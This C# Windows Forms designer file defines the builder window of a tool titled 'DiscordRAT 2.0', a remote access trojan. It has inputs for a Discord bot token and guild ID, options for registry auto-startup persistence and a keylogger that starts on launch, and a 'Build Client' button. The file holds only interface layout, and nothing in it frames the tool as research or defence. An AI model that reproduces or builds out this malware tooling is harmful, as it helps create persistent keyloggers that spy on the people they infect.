namespace builder
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.checkBoxAutoStartup = new System.Windows.Forms.CheckBox();
            this.checkBoxAutoKeylogger = new System.Windows.Forms.CheckBox();
            this.labelStatus = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(41, 60);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(350, 20);
            this.textBox1.TabIndex = 0;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(41, 35);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(95, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "Discord Bot Token";
            // 
            // textBox2
            // 
            this.textBox2.Location = new System.Drawing.Point(41, 130);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(350, 20);
            this.textBox2.TabIndex = 2;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(41, 105);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(82, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "Discord Guild ID";
            //
            // checkBoxAutoStartup
            //
            this.checkBoxAutoStartup.AutoSize = true;
            this.checkBoxAutoStartup.Location = new System.Drawing.Point(41, 180);
            this.checkBoxAutoStartup.Name = "checkBoxAutoStartup";
            this.checkBoxAutoStartup.Size = new System.Drawing.Size(168, 17);
            this.checkBoxAutoStartup.TabIndex = 5;
            this.checkBoxAutoStartup.Text = "Enable Auto-Startup (Registry)";
            this.checkBoxAutoStartup.UseVisualStyleBackColor = true;
            //
            // checkBoxAutoKeylogger
            //
            this.checkBoxAutoKeylogger.AutoSize = true;
            this.checkBoxAutoKeylogger.Location = new System.Drawing.Point(41, 210);
            this.checkBoxAutoKeylogger.Name = "checkBoxAutoKeylogger";
            this.checkBoxAutoKeylogger.Size = new System.Drawing.Size(175, 17);
            this.checkBoxAutoKeylogger.TabIndex = 6;
            this.checkBoxAutoKeylogger.Text = "Auto-Start Keylogger on Launch";
            this.checkBoxAutoKeylogger.UseVisualStyleBackColor = true;
            //
            // labelStatus
            //
            this.labelStatus.AutoSize = true;
            this.labelStatus.ForeColor = System.Drawing.Color.Blue;
            this.labelStatus.Location = new System.Drawing.Point(41, 290);
            this.labelStatus.Name = "labelStatus";
            this.labelStatus.Size = new System.Drawing.Size(86, 13);
            this.labelStatus.TabIndex = 7;
            this.labelStatus.Text = "Status: Ready...";
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(41, 245);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(120, 32);
            this.button1.TabIndex = 4;
            this.button1.Text = "Build Client";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(430, 330);
            this.Controls.Add(this.labelStatus);
            this.Controls.Add(this.checkBoxAutoKeylogger);
            this.Controls.Add(this.checkBoxAutoStartup);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.textBox2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.textBox1);
            this.Name = "Form1";
            this.Text = "DiscordRAT 2.0 - Builder";
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox textBox2;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.CheckBox checkBoxAutoStartup;
        private System.Windows.Forms.CheckBox checkBoxAutoKeylogger;
        private System.Windows.Forms.Label labelStatus;
    }
}
